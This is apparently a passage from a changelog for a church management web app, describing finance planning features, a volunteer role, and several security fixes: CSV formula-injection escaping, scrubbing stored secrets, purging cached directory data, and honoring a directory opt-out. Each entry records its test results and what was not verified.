  screen. While picking is open, an excluded leaf still renders (dimmed, checkbox unchecked, so it
  can be put back) — showing its own real value, never zeroed — but is never counted in a total.
  Not persisted server-side: a print/export exclusion is a "leave this off THIS sheet" choice, not a
  standing Chart of Accounts decision, so it resets on reload rather than following the church into
  next year's plan.
- **Export CSV** — `finPlanExportCsv()` downloads `_finPlanCsvRows`, a table built alongside the
  HTML on every render (not a second computation) so the export can never drift from what's on
  screen — respects the current column visibility and row exclusion exactly.
- **Print** — `finPlanPrint()` sets `body.printing-plan` (same `body.printing-<feature>` contract as
  `.printing-comp`/`.printing-board`), showing only `#fin-plan-print-card` (the table itself) — the
  navy summary strip, the year-input/commit header actions, and the five-year outlook chart below
  the table are working-session controls, not part of a sheet handed to a board member. No separate
  print-only layout to build, unlike the Council report — the table already lives on the page.
- **Per-leaf category picker directly on Planning** (Board view, admin only) — reassigns one
  account's category from the row it's actually sitting in, via the same
  `finPlanSetBoardCategory()`/`finCoaSaveCategories()` save path Chart of Accounts uses, so the two
  surfaces can never disagree about which store wins.
- **Deliberately not built this pass** (scope kept to what the handoff's core ask needed): a
  "moved" indicator badge on a reassigned account, inline category-header renaming on Planning
  itself (kept on Chart of Accounts only), and a batched "Save changes" step on Chart of Accounts
  (immediate-save-per-action instead, per the reasoning above).
- **A real bug in my own draft, caught by the build, not by reading**: a backtick inside a comment
  ("… category_path is in `excluded`") closed the outer `String.raw` literal and broke the entire
  served script — the SC3-BUG1/FIN15/TAP2-BUG class this file has hit repeatedly. Caught by running
  the actual assembled bundle through Node, not by `node --check` on the module file alone (which
  only validates the outer template literal's own delimiters, not the served text inside it).
- `npm test` (2056/2056, 43 new across `test/finance-planning-board-categories.test.js` — the real
  backend route against real in-memory SQLite — and `test/finance-planning-chart-of-accounts.test.js`
  — the real assembled `CHMS_APP_CORE_JS`+`CHMS_APP_EXT_JS`+`CHMS_APP_FINANCE_JS` bundles run in a
  `vm`, driving `finBuildBoardTree`, the Board-view/QuickBooks-order toggle, column visibility, row
  exclusion/totals-consistency, CSV export, every Chart of Accounts handler including the real
  fetch-backed saves, and `finPlanPrint`). **Every new test verified non-vacuous** by injecting the
  exact regression it guards directly into the production code and confirming the right test (and
  only that test) failed — 8 injections across both files, 8 correct failure sets. One injection
  (removing `finRecomputeTreeTotals()` from `finPlanFilterExcluded`) caused **no** test failure —
  traced to `finPlanComputeMaps()` never actually reading a group node's own stale
  `totalActualCents`/`totalBudgetCents` fields, only ever summing from its own bottom-up maps; left
  the call in place as harmless defensive code (matches the surrounding comment's stated intent) but
  didn't write a test claiming to cover it, since nothing currently observable depends on it. Two of
  my own test assertions were wrong on the first pass and were corrected against the real rendered
  output rather than forced: a toolbar CHIP for a hidden column stays in the DOM (struck through, so
  it can toggle the column back on) rather than disappearing, which I'd initially asserted backwards;
  and an admin's Actual cell renders as an editable `value="50000"` input, not the comma-formatted
  text a non-admin sees. Three pre-existing tests in `test/finance-qb-order.test.js` needed updating,
  not the production code — they render the Planning table directly and never set
  `_finPlanViewMode`, so once Board view became the default they were silently exercising the wrong
  tree; fixed by having those two helpers explicitly force `_finPlanViewMode = 'qb'`, matching what
  their own describe block ("Planning budget builder — QuickBooks order") already says they're
  testing. Plus `node --check` on all four touched source files and both extracted bundle scripts,
  and a div/tag-balance scan of the fully assembled `CHMS_HTML` (1122/1122) and its extracted CSS
  bundle (1373/1373 braces). One pre-existing, unrelated test failure
  (`test/finance-property-funds-itself.test.js`'s "deducts mortgage principal") was confirmed present
  on the branch before this session's changes too (a date-sensitive amortization fixture, not
  touched by anything here) — not fixed, out of scope. **Not verified**: a live browser.
  (`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/js-core.js`,
  `src/frontend/html-tabs.js`, `src/frontend/html-head.js`,
  `test/finance-planning-board-categories.test.js`, `test/finance-planning-chart-of-accounts.test.js`,
  `test/finance-qb-order.test.js`)

### v1.219.0 — Planning: FY{base} Actual is editable per line; dead $0.00/$0.00 accounts hidden (2026-08-30)

Two asks off a live Planning ("Category by category") screenshot. **(1)** FY{base} Actual was
plain text — the only way to fix a wrong imported/synced figure was to re-upload or re-sync the
whole year. New `PUT /admin/api/finance/church/actual-override` (admin-only) writes a per-account
correction into `finance_church_entries` as `source='manual_actual_override'`;
`resolveChurchYearPrecedence()` now layers any such override onto whichever source actually won
that year (qbo_sync/import/import_activity/plan_committed) — a REPLACEMENT of just the one named
`category_path`, never a new priority tier (a same-shaped tier would have made the one edited line
the ONLY row surviving for the whole year, deleting every other account). So the fix shows up
everywhere Actual is read — Church Report, Financial Health, Planning — not just the cell it was
typed into, and survives a future re-sync/re-import of that year. The Planning table's Actual
column is now a live-editable dollars-and-cents input (`finPlanEditActualCell`, autosaved on the
existing 800ms debounce alongside Plan/Projected), with every group/subtotal/Net row recomputing
from a new `actualCentsByPath` map so an in-progress edit's effect is visible immediately, not just
after a reload; clearing a cell to blank deletes the override and reverts to the real
imported/synced figure. **(2)** Reported in the same message: this church's QuickBooks carries an
old, superseded pair of accounts ("50160 MDO Supplies"/"50161 MDO Wages") sitting at $0.00/$0.00
in every report forever, alongside their real renamed replacements ("57160 MDO -
Supplies"/"57161 MDO - Wages"). The existing "hide Unapplied Cash only when it's $0" rule
(`finPruneEmptyUnappliedCash`, FIN58/FIN60) turned out to be the first NAMED instance of a general
pattern rather than a special case — generalized into `finPruneEmptyLeaves`: any line with $0.00
actual AND $0.00 budget is dropped, whatever its name; a group is only pruned once every one of its
own children has been pruned away too. **Deliberately never prunes a top-level classification root
itself** (Income/Expenses/Cost of Goods Sold/...) even if it nets to zero — that's a bigger,
different decision than a dead line vanishing, and an existing test caught exactly this the first
time (an all-zero synthetic Income/Expenses fixture disappeared outright); fixed by pruning within
each root's own children, never the roots array itself. `npm test` (2014/2014, 30 new across
`test/finance-church.test.js`, `test/finance-budget-plan.test.js`, and `test/finance-qb-order.test.js`,
the latter two driving the real assembled bundle in a `vm`); **every new test verified non-vacuous**
by reverting `src/api-finance.js`/`src/frontend/js-finance.js` to the pre-change version and
confirming all new tests fail (21/21, plus the whole `finance-church-tree.test.js` suite failing to
even load — the renamed extraction target). `node --check` on all three built bundles, div-balance
on the assembled `CHMS_HTML` (1120/1120). **Not verified**: a live browser. (`src/api-finance.js`,
`src/frontend/js-finance.js`, `test/finance-church.test.js`, `test/finance-budget-plan.test.js`,
`test/finance-qb-order.test.js`, `test/finance-church-tree.test.js`)

### v1.218.0 — Mobile Admin: Scheduler screen, current/upcoming Sunday only (2026-08-30)

MOB-ADMIN4 Phase 4. New read-only **Scheduler** screen on the phone-optimized Mobile Admin shell —
scoped deliberately narrow per the user's own priority: "who's serving this Sunday, by role, and
have they confirmed," not a phone port of the full desktop Scheduler tab. New
`GET /admin/api/mobile/scheduler/this-sunday` (`src/api-mobile.js`), gated admin/staff only
(narrower than the rest of Mobile Admin, matching the desktop Scheduler tab's own existing gate —
no new permission-matrix item was added). Reads the current/upcoming Sunday's role assignments
straight out of the `scheduler_data` blob table (`ws_schedule_v2`/`ws_people`/`ws_confirmations` —
there's no relational schema for the schedule itself), resolves person names, and shows
confirm/decline status labeled with an "as of" sync time since that snapshot can lag a volunteer's
actual RSVP click until an admin re-syncs on desktop. `npm test` (1984/1989, 10 new in
`test/mobile-scheduler.test.js`); every new test verified non-vacuous by injecting the exact
regression it guards. `node --check` + tag-balance on the assembled `MOBILE_ADMIN_HTML`. **Not
verified**: a live browser or a real phone. Full detail and reasoning under MOB-ADMIN4 → Phase 4 in
CLAUDE.md. (`src/api-mobile.js`, `src/mobile-admin-html.js`, `src/frontend/js-core.js`,
`test/mobile-scheduler.test.js`)

### v1.198.0 — New "volunteer" role: read-only access to the Volunteers screen only (2026-08-21)

Requested to let someone test the Christmas Market public sign-up flow and then check, inside
Connect, that their test registration actually landed — without handing them a full staff
account. New role `volunteer`, structurally separate from the configurable
finance/staff/council/member matrix (like member's directory view, not an item in it): it sees
**only** the Volunteers sidebar item (Signups / Ministry Roles / Events / Templates), read-only.

**Backend, three small changes, no schema/migration needed** (`app_users.role` has no CHECK
constraint — any string is accepted): (1) `api-chms.js` denies the role outright at the top of
`handleChmsApi` — People/Households/Giving/Reports/etc. have nothing for it, so it gets a clean
403 rather than inheriting the member tier's redaction logic it doesn't need; (2) `api-admin.js`'s
user create/update now accepts `role=volunteer` (`VALID_APP_ROLES`, deduped from two copies into
one shared constant — the FIN58-class two-copies-drift bug this codebase's own history warns
about); (3) the `/me` `roleLabels` map gained `volunteer` (plus the pre-existing `council` gap —
DSN8 — fixed alongside it, since it's the same line). **Nothing else needed changing**: `GET
/admin/api/{events,signups,ministry-roles,volunteer-templates}` were already open to any
authenticated role (only their writes are admin/staff-gated), and the worker's scheduler-privileged
gate (`/email/send`, the Breeze proxy, RSVP store, etc. — SEC11/SEC12) already excludes any role
that isn't admin or staff, so `volunteer` is correctly denied there with zero changes.

**Frontend**: sidebar CSS hides every `.s-item`/`.s-section-hdr` for `role-volunteer` by default
(fail closed, so a sidebar item added later stays hidden until someone deliberately shows it) and
shows back only the Volunteers item; `showTab()` redirects any other tab request to `volunteers`
(same pattern as the existing member→people redirect) and the `volunteers` tab's own admin-only
gate now also admits this role; default landing tab is `volunteers`; `loadFunds()` is skipped for
it (guaranteed 403, same as member). Settings → Users gained `volunteer` in the role dropdown and
color map.

**⚠ Deliberately left as a known limitation, not fixed**: the Volunteers tab's write controls
(status dropdown, Delete, Link to Person, Send Email, Add/Edit modals) are not hidden for this
role — they'll render and then 403 on click, with the existing error handling. Scoped this way
because hiding them would mean auditing and touching `js-volunteers.js`'s render functions
throughout, disproportionate to "give someone a read-only test account" — worth doing as a
follow-up if this becomes a standing role rather than a temporary one.

`npm test` (1731/1731, 14 new in `test/volunteer-role.test.js`, driving the real
`handleAdminApi`/`handleChmsApi` against real in-memory SQLite with a real HMAC-signed cookie);
**every new test verified non-vacuous** by reverting the `api-chms.js` deny block and confirming
the two tests that pin it fail correctly. `node --check` on all three assembled app-JS bundles
(`app-member.js`/`app-staff.js`/`app-ext.js`) and a div-balance scan of the assembled shell. **Not
verified**: a live browser. (`src/api-chms.js`, `src/api-admin.js`, `src/frontend/js-core.js`,
`src/frontend/html-head.js`, `src/frontend/js-settings.js`, `test/volunteer-role.test.js`)

### v1.197.0 — A hidden event's short link locks instead of dead-ending (2026-08-21)

Reported: visiting a hidden event's short link (e.g. `/christmasmarket` while the event is
hidden) showed a raw `{"error":"Unauthorized"}` JSON page. Root cause: the short-link route in
`tlc-volunteer-worker.js` only redirected to `/#event-<id>` for a NON-hidden event (`AND
hidden=0` on the slug lookup); for a hidden one the lookup came back empty, the request fell all
the way through to the scheduler's auth-gated block further down (built for staff/admin routes,
"authentication is not authorization" per SEC11/SEC12), and a public visitor with no cookie hit
its blanket 401 — a dead end that looks like a real error, not an unpublished event.

Asked for: instead of the error, lock entries and show "registrations are on hold." Fixed at
three points, not just the redirect: (1) the short-link lookup no longer filters on `hidden`, so
it always redirects to the event's real page; (2) `GET /api/events` now returns hidden events too
(with their `hidden` flag intact) instead of omitting them — a direct/deep link needs to be able
to find one, even though the browsable grid (`renderEventList`) filters them back out client-side
so they stay unlisted; (3) the event detail page and the Christmas Market page both render a
"Registrations are on hold" notice with no form controls at all when `ev.hidden` is set, instead
of the normal signup UI. **Server-side backstop, not just a UI lock**: `handleSignup` now checks
the target event's `hidden` flag itself and 409s with "Registrations for this event are currently
on hold" — closes the gap for a stale tab or a replayed POST that bypasses the locked page
entirely.

`npm test` (1717/1717, 4 new in `test/serve-event-hidden-lock.test.js`); verified non-vacuous by
confirming the pre-fix `/api/events` `WHERE hidden=0` filter and the missing `handleSignup` guard
both fail the new tests. `node --check` on the extracted `PUBLIC_HTML` `<script>` block (this
module is a non-`String.raw` template literal — new unicode-escape copy double-backslash-escaped
to match the file's existing convention) and on `api-scheduler.js`/`tlc-volunteer-worker.js`. Not
verified: a live browser. (`tlc-volunteer-worker.js`, `src/api-scheduler.js`,
`src/public/scripts.js`, `src/public/market.js`, `test/serve-event-hidden-lock.test.js`)

### v1.196.0 — Four dead credentials out of the login path (2026-08-19)

P22-G, retiring **SEC22**. `handleAdminLogin` pulled `FINANCE_PASSWORD`, `STAFF_PASSWORD`,
`MEMBER_PASSWORD` and `ADMIN_EMAIL` out of `env` and never referenced any of them again. Deleted.

The deletion is a no-op by construction; what it fixes is what the names imply. **⚠ Three of
them read as per-role shared passwords, and anyone finding them in a Cloudflare secret list
would reasonably conclude the app has one login per role and that rotating them is a security
control.** It never had one. Every real credential lives in `app_users`, plus `ADMIN_PASSWORD`
for break-glass — and a shared role password is deliberately not a thing here: it is an
authentication path with no account behind it, so nothing to deactivate, nothing to audit, and
no way to tell afterwards whose login it was. The comment left in its place says exactly that,
because the next person to want a quick per-role login will land on the same four lines.

**A live documentation defect surfaced on the way, and it was worse than the dead code.**
`SECRETS.md` listed **`ADMIN_EMAIL`** under Required Secrets as "the `From:` address on all
Resend emails" — it is not, and never has been. The From address is **`EMAIL_FROM`**, which the
file did not document at all. `sendResend()` refuses outright without it, so an operator
following SECRETS.md would have set `ADMIN_EMAIL`, seen no error anywhere, and had a Worker that
sent no email at all. Corrected, with the `RESEND_API_KEY` entry's cross-reference fixed too, and
a new **"Variables the Worker does not read"** section naming all four so a secret list never has
to be reverse-engineered from source again.

- Tests: `test/admin-login-credentials.test.js` (11), driving the real `handleAdminLogin` against
  a fake `env` with all three role passwords set. The behavior half proves they were never a
  login — before or after — and that the credentials that ARE real still work: break-glass,
  an active `app_users` account, a deactivated one refused, and a missing `ADMIN_PASSWORD`
  refusing everyone rather than falling through to a role password.
- **The source scan is the part that lasts**: a dead credential read is indistinguishable from a
  live one at a glance, which is how these four survived. It asserts the login path reads exactly
  one password from `env`, and no other credential-shaped name at all.
- **Every test verified non-vacuous** by injecting the exact regression it guards — 5 injections,
  5 correct failure sets, including a real working `FINANCE_PASSWORD` login path (fails 4) and
  merely re-adding the dead const (fails 3).

`npm test` 1713/1713 (was 1702). No frontend change; `DEPLOY_VERSION` bumped for the record.
**Not verified**: a live browser or a real sign-in against production D1.
(`src/api-admin.js`, `SECRETS.md`, `test/admin-login-credentials.test.js`)

### v1.195.0 — Cached directory data no longer outlives the session (2026-08-19)

P22-D, retiring **SEC19**. Two independent problems in `SW_JS`, both about data cached by
one session and still sitting there for the next one.

- **`/admin/api/people` — the whole directory: names, emails, phones, addresses — went into
  a cache named `chms-api-v1`**, a fixed name, and the `activate` handler's eviction list
  deliberately kept it. So unlike `STATIC_CACHE` it was never rotated by a deploy, and
  nothing anywhere cleared it on sign-out. On a shared office machine it stayed on disk after
  the person left, and any XSS on the origin (SEC13/SEC14's class) could read the directory
  out of it with one `caches.match`. Now `'chms-api-' + VERSION`, so `activate` treats it
  exactly like the static cache and one deploy's copy cannot survive into the next.
- **Purged outright at sign-out.** Handled in the worker's `fetch` handler on
  `/admin/logout`, not in the page, because the Sign Out control is a plain
  `<a href="/admin/logout">` and because this also catches somebody typing the URL.
  **⚠ `waitUntil` alone, deliberately — no `respondWith`.** The navigation is left
  completely untouched, so the worker cannot break signing out even if the purge throws; a
  test asserts no `respondWith` and no re-fetch, because the obvious "intercept and re-issue"
  version of this puts the purge in front of the one request that must never fail.
- **Also purged on a 401** from the people endpoint. That is the case sign-out never sees and
  the one the shared-machine scenario actually turns on: nobody clicks Sign Out, the tab sits
  until the cookie expires, and the next person signs in. A 401 is the first moment the
  worker can know the session ended.
- **Scoped to the `chms-` prefix**, not `caches.keys()` wholesale. Nothing else on this
  origin uses Cache Storage today, but deleting another app's cache is not ours to do.

**The shell is now cached per role.** Its own comment claimed the markup "interpolates
nothing per-user" — true when MOB4 wrote it, and false since CR9 made `chmsHtmlForRole()`
emit one script tag for a member and three for everyone else. Cached under the bare key `/`,
an offline relaunch could hand one role the other role's script set.

- **⚠ The worker cannot tell which role a response was built for**, and that is the whole
  difficulty: the write side could guess, but the read side (an offline cold launch) has no
  request, no cookie and no page to ask. So the PAGE names its role — `applyRoleUI()` posts
  `{type:'chms-role'}` once, the worker keeps the answer at `/__chms/shell-role`, and the
  shell is stored at `/__chms/shell/<role>`. Both live in `STATIC_CACHE` on purpose: it is
  evicted every deploy, and so are the `?v=` bundles a cached shell references — a shell that
  outlived its bundles could not boot offline anyway, so the marker's lifetime should match
  the shell's exactly.
- **The role is sanitized to letters before it reaches a cache key** — it arrives by
  `postMessage`, which any page on this origin can send, and it is concatenated into a key.
- Uses `serviceWorker.ready`, not `.controller`, which is still `null` on the very first load
  (the worker registers during that same page load and only claims clients afterwards).
- Cost, accepted: the first offline launch after a deploy, or before the page has ever
  reported a role, falls to the offline page rather than the cached shell. The alternative
  the plan also allowed — stop caching the shell — would have given that up permanently and
  undone MOB4.

**Considered and rejected**: keying the shell by parsing the response body for its script
tags (the read side still has nothing to compare against), and re-issuing the logout request
from inside `respondWith` (buys ordering nobody needs, at the cost of putting the worker in
the path of signing out).

`npm test` (1702/1702, 28 in `test/service-worker.test.js`, up from 17, all driving the real
generated worker and — for the role handoff — the real shipped `app-member.js` bundle);
**every new test verified non-vacuous** by injecting the exact regression it guards (8
injections, 8 correct failure sets). Three existing tests pinned the behavior being corrected
and were updated, not deleted: the two shell-cache-key assertions, and the eviction test that
asserted `chms-api-v1` *survives* activate. **⚠ A bug in the test harness, not the worker, was
found on the way**: the fake `caches` returned the stored `Response` object itself rather than
a clone, so a second read of one entry saw an already-consumed body — that is what made the
role marker look broken when it was not. Plus `node --check` on all four built bundles and the
worker, and a div-balance scan of the assembled `CHMS_HTML`. **Not verified**: a live browser,
a real installed PWA, or a real offline relaunch. (`src/html-chms.js`,
`src/frontend/js-core.js`, `test/service-worker.test.js`)

### v1.194.0 — Market summary: structured shift times and a job lead (2026-08-19)

MKT2 — the other half of the website repo's v5.30.0 Christmas Market roster
redesign. `GET /api/signups/christmasmarket/summary` gains four optional fields:
`shifts[].start`, `shifts[].end`, `shifts[].date` and `lead`. Purely additive — no
existing key changed or removed, and the website needed no change, because its
`normalizeRoster()` already prefers all four the moment they appear and falls back
to parsing the label when they do not.

- **`start`/`end`/`date` needed no new storage** — `serve_roles.role_date` /
  `start_time` / `end_time` have been populated since the market's own seed and were
  simply never in the payload. Passed through verbatim as **wall clocks**
  (`9:00 AM`, `2026-12-05`): no `Z`, no offset. The caller reads the literal digits,
  so a UTC instant meaning 9am Central would draw the crew at 3pm.
- **`lead` is a new `serve_roles.lead` column** (migration `0036`), typed by the
  coordinator in the existing Add/Edit shift modal and shown on the shift row.
  Nothing in this repo had any per-role owner or contact. It is deliberately NOT
  derived from who signed up — a lead is usually a committee member running the job
  rather than somebody occupying one of its spots. **No lead is seeded**; blank is a
  real state and the website prints it as "Lead · Unassigned".
- **The group-level `lead` is withheld when two shifts of one job name different
  people** — the caller reads one lead per job, so printing the first one found puts
  a real name against the wrong day. Per-shift `lead` is always exact.
- **`lead` is withheld from the public `/api/events`**, which named nobody before
  this column existed and still names nobody now.

`npm test` (1670 passed, 5 skipped, 93 files), `node --check` on all four built app
bundles, div-balance on the assembled shell. Verified end to end across both repos:
the real handler over the real seed (36 jobs, 67 shifts), its output fed into the
real website Worker — day switch appears, grid draws a 7:30–11:00 block at 269px
against 152px for the 9:00–11:00 beside it, leads on the panels and printed sheets,
CSV Day/Date/Job lead/Start/End filled on all 206 rows. The website's own suites
re-run unchanged: `admin/market.test.mjs` 318, `test/market-admin.test.mjs` 36,
`test/admin-redesign.test.mjs` 1257. 11 injections, 11 correct failure sets. Not
verified: a live browser or a real deploy.
### v1.194.0 — Phase 22-C: one CSV escaper per runtime, and the formula guard reaches the server (2026-08-19)

Closes SEC18.

**What was wrong.** SW15 added a spreadsheet formula guard to the giving-diagnose export and the
pattern was carried to two more FRONTEND builders — and to none of the four server-side ones.
That split had it exactly backwards: the server-side exports are the ones carrying
attacker-supplied text. `request_text` on the prayer export comes from the **public** prayer
form; `name` and `notes` on the volunteer export come from the **public** Serve sign-up form. A
cell beginning `=`, `+`, `-` or `@` is evaluated as a FORMULA by Excel, Sheets and Numbers when
a staff member opens the file days later.

**And `giving/statement?format=csv` had no escaping at all** — `fund_name` and `method` were
interpolated straight into a comma-joined line, so a single fund named "Building, Phase 2"
silently shifted Amount and Method one column to the right for the whole statement. Its
`Content-Disposition` also carried `person.last_name` raw: a quote truncates the filename and a
newline makes the Headers constructor **throw**, turning a statement download into a 500.

**Now one escaper per runtime boundary** — `csvCell`/`csvRow` in `api-utils.js` for the server,
the same pair in `js-core.js` for the browser, and a documented local copy in
`scheduler-html.js` because that file also ships as the standalone `scheduler/index.html` and
cannot import from an admin bundle. Three definitions across three runtimes, replacing six
hand-rolled ones with three different notions of what needs quoting (SW17's lesson). A test runs
the browser copy and the server copy over the same inputs and asserts they agree, and another
scans `src/` for any hand-rolled quote-doubling outside the three.

**⚠ One deliberate behavior change: a plain number is EXEMPT from the guard.** The three
frontend copies guarded a leading `-` unconditionally, which shipped **every negative amount as
text** — a refund fell straight out of the bookkeeper's `SUM()` with nothing on screen to say
so, and refunds are real in this data (G6). `-1234.56` is now left alone; `-1+1` and `-1e9` are
still prefixed. This makes finance exports arithmetically correct in Excel for the first time.

`safeFilenamePart()` sanitizes the surname before it reaches the header, NFKD-then-strip so an
accented name degrades to "Muller" rather than disappearing.

**⚠ Two SC3-BUG1 build breaks in one edit, both caught by the build rather than by reading.**
`scheduler-html.js` is a plain template literal, so a backslash in the source is eaten before
the browser sees it. The first pass wrote the guard as a character-class regex with `\t`/`\r`
escapes: the escapes vanished and the rendered regex was invalid, killing the whole script. The
second pass fixed the code and died anyway — in the **comment** that quoted the regex, because
the rendered tab broke the comment line itself. The shipped version uses `String.fromCharCode`
and `[0-9]` classes and has no backslash anywhere, in the code or the comment, with a note
saying why.

**`npm test` 1672/1672** (93 files, 5 skipped), up from 1654/92. New
`test/csv-export-escaping.test.js` — 18 tests: the pure helpers, the statement export end to end
against real SQLite (comma-in-fund-name, formula fund name, hostile surname in the header), the
two public-input exports end to end, and the one-escaper-per-runtime invariant.

**Every new test verified non-vacuous — 12 injections, 12 correct failure sets**: the formula
guard removed, the number exemption dropped, RFC 4180 quoting removed, the filename sanitizer
neutered, the statement CSV returned to raw interpolation, the filename left unsanitized, the
browser copy made to diverge from the server copy, a per-tab escaper reintroduced, hand-rolled
quoting added to an unrelated module, the scheduler guard removed, and both public-input
exports returned to a hand escaper.

**⚠ Two of my own test fixtures were wrong and were fixed, not worked around**: the statement
test called the handler with the wrong route segment and got a null back — every assertion would
have failed on a null dereference rather than saying what was wrong, so the helper now asserts
the route matched first. And the public-input fixtures embedded a payload containing a quote
into inline DDL, which broke the fixture build; rows now go in through bound parameters.

`scheduler/index.html` resynced by evaluating the module (SC5); the served standalone script and
the embedded bundle both re-parsed, and the served script scanned for stray control characters.

**Not verified**: a live browser, or a real export opened in Excel. (`src/api-utils.js`,
`src/api-reports.js`, `src/api-admin.js`, `src/api-import.js`, `src/scheduler-html.js`,
`src/frontend/js-core.js`, `src/frontend/js-attendance.js`, `src/frontend/js-finance.js`,
`src/frontend/js-reports.js`, `scheduler/index.html`, `test/csv-export-escaping.test.js`)

### v1.193.0 — Phase 22-B: the Breeze key and WORKER_SECRET stop being stored in D1 (2026-08-19)

Closes SEC17.

**What was wrong.** `ws_breeze_settings` stored `apiKey` (Breeze) and `workerSecret` alongside
real settings, in localStorage and mirrored into the `scheduler_data` table — and
`GET /admin/api/scheduler/data` returns that table **wholesale to admin OR staff** (the bar SW1
set in v1.9.0). So both credentials were readable by every staff login.

**`WORKER_SECRET` is the one that matters.** It is the `X-Worker-Secret` bypass credential for
the scheduler backend routes Phase 21 just gated — it never expires, it is not scoped to a user,
and it cannot be revoked individually, so it outlives deactivating the account it leaked to. The
Breeze key is read/write on the church's whole Breeze database.

**Neither was consumed from that blob.** The Worker reads both from `env`, and the Settings
screen already displayed them read-only as "🔒 configured on server" from the config endpoint's
`hasBreezeApiKey`/`hasWorkerSecret` presence flags. The stored copies were pure legacy.

**Fixed at four layers, and the ordering of the guarantees matters:**
1. **Server write-strip (authoritative)** — `stripServerManagedSettings()` in `api-admin.js`
   removes `apiKey`/`workerSecret`/`resendKey`/`emailFrom` from `ws_breeze_settings` on **both**
   write paths (bulk snapshot and per-key). A stale browser tab still running the old bundle
   cannot put them back. **⚠ Only `ws_breeze_settings` is scrubbed** — a key named `apiKey` on
   some other record is data, not a credential, and a test pins that.
2. **One-time D1 scrub** — `scrubServerManagedSchedulerSecrets()` in `db.js`, run from
   `_doInitDb`, removes what is already stored. Deliberately **not** marker-gated: it is one
   read plus a write only when something is there, and re-running it is exactly what should
   happen if a key ever reappears. Added to `_schemaFingerprint`'s list so an edit to its body
   re-triggers the init the same way a seed edit does.
3. **Client strip at the two storage chokepoints** — `getBreezeSettings()` strips on read and
   `saveBreezeSettings()` on write, so all 25 call sites are covered by two edits rather than a
   third hand-rolled copy of the Resend delete (SW17's lesson). Simply opening Settings now
   evicts a stale key from that browser.
4. **Stop sending what we no longer hold** — `breezeGet`/`breezePost` guarded on
   `!s.subdomain||!s.apiKey` and sent `X-Breeze-Api-Key`. **⚠ Left alone, both helpers would
   have rejected outright** with "No Breeze credentials configured" once the key was stripped.
   The proxy already prefers `env.BREEZE_API_KEY` over that header, so it was ignored in
   practice; sending it only risked putting the key in a request log. Guard is now on the
   subdomain alone.

**Also removed**: four dead hidden `<input>`s (`breeze-apikey`, `breeze-worker-secret`,
`email-resend-key`, `email-from`) — declared, populated, never read. A field that silently
discards what you type is worse than no field.

**⚠ Nine `s.workerSecret ? {…} : {}` header conditionals are left in place and are now
permanently inert** — documented at `_workerHeaders()`. They are optional-header branches, not
an auth path that can silently return: the value is stripped on read and again server-side, and
these calls are same-origin from an admin session, which is what actually authorizes them.
Rewriting nine `fetch` call sites inside a 500 KB template literal was not worth the risk in a
security fix; the invariant is enforced where it is enforceable.

`scheduler/index.html` resynced by evaluating the module (SC5), and the served `<script>` block
re-parsed — this file is a plain template literal, so backslashes double and a stray backtick
breaks the whole bundle (SC3-BUG1, the repo's most-repeated build break).

**`npm test` 1654/1654** (92 files, 5 skipped), up from 1641/91. New
`test/scheduler-settings-secrets.test.js` — 13 tests: the pure helper, both server write paths
against real SQLite, the scrub (including idempotence, a missing row and unparseable JSON), and
the client half extracted from the **real shipped embed bundle**.

**Every new test verified non-vacuous — 10 injections, 10 correct failure sets**: each write-path
strip removed, the key list emptied, the helper made to mutate its input, the scrub neutered,
the client read-strip and write-strip removed, the `X-Breeze-Api-Key` header restored, and a
secret input field restored in both the markup and the JS.

**⚠ One of my own assertions was wrong twice and was corrected, not forced.** It first tripped
on the explanatory comment that names the header (the same self-documentation trap as Phase 21)
and was narrowed to match the header being SET; then it checked only the JS bundle while the
input it claimed to guard lives in the MARKUP bundle, so restoring a field passed cleanly. Both
halves are now asserted.

**Not verified**: a live browser, or a real Breeze/scheduler round trip against production D1.
**One consequence for an admin**: nothing to do — the Settings screen already showed these as
server-configured, and the scrub runs itself on the first request after deploy.
(`src/api-admin.js`, `src/db.js`, `src/scheduler-html.js`, `src/scheduler-inline.js`,
`src/frontend/js-core.js`, `scheduler/index.html`, `test/scheduler-settings-secrets.test.js`)

### v1.192.0 — Phase 22-A: the member directory honors "Include in directory" (2026-08-19)

Closes SEC16. **This one was a decision before it was a fix** — filtering changes who appears in
a directory the congregation is about to be invited into, so it was put to the user rather than
defaulted. Decision 2026-08-19: honor the checkbox.

**What was wrong.** The person edit modal's `pm-public` checkbox is labeled *Include in
directory*, titled *"Uncheck to hide this person from printed/public directories"*, and is drawn
as the PARENT of the five `dir_hide_*` field toggles. `public_directory` was honored by the
printed/exported directory (`api-import.js`) and referenced **nowhere** in the People query
path — so an opted-out person still appeared by name, photo, household and member type to every
`member` account, and only the per-field toggles suppressed contact details. The checkbox's
visual parenthood over those toggles is exactly the promise that was not being kept. **No test
covered this column at all**: a grep of `test/` for `public_directory` returned nothing.

**Four surfaces, because three would have leaked.**
1. `GET people` — `AND p.public_directory=1` for member-role viewers. The COUNT query shares the
   same `where`, so the pagination total agrees with the list rather than promising a page that
   can never be filled.
2. `GET people/:id` — **404**, not 403, matching how a non-member `member_type` is already
   handled. A member has no business learning the id exists.
3. `GET households/:id` — family chips filtered to visible members.
4. **⚠ Household-name disambiguation, which is the one that is easy to miss.** A duplicated
   household name renders as "Doe (John)" — a person's *first name* — and both the list
   endpoint's batch query and the household endpoint compute it from the head of household
   regardless of opt-out. An opted-out head's name therefore surfaced on the label of the very
   list that excluded them. Both now draw from a visible member for member-role viewers only;
   staff still see the real head.

**A household whose every member has opted out is 404 to a member.** Without it a member could
walk `/households/1..N` and harvest household names and photos for precisely the families that
asked to be left out. Unreachable through the UI either way — the only route in is clicking
someone who IS in the directory — and `js-people.js:333` already `.catch`es, so it degrades
silently.

**⚠ Nobody disappears on deploy.** The column is `INTEGER NOT NULL DEFAULT 1`, so every
pre-existing row is already 1; only people an admin has since unchecked are affected.

**⚠ A member who opts themselves out can no longer find themselves in the directory either.**
`app_users` has no `person_id`, so there is no "always show me myself" carve-out to hang a
special case on. That is consistent with what the checkbox says, but it will generate a support
question eventually, so it is written down here.

Staff, finance, council and admin views are untouched — the opt-out hides someone from the
directory, not from the church office. That is half of what the new tests assert, because
over-applying this is the real risk in the change.

Tooltip updated to say what the checkbox now actually governs (the printed/exported directory
AND the member directory in Connect) and to distinguish it from the field toggles beneath it.

**`npm test` 1641/1641** (91 files, 5 skipped), up from 1629/90. New
`test/member-directory-optout.test.js` — 12 tests running the real `handlePeopleApi` and
`handleHouseholdsApi` against real in-memory SQLite, member and staff side by side on one
fixture. `test/member-household-redaction.test.js`'s fixture gained the column the real schema
has, since the household query now selects it.

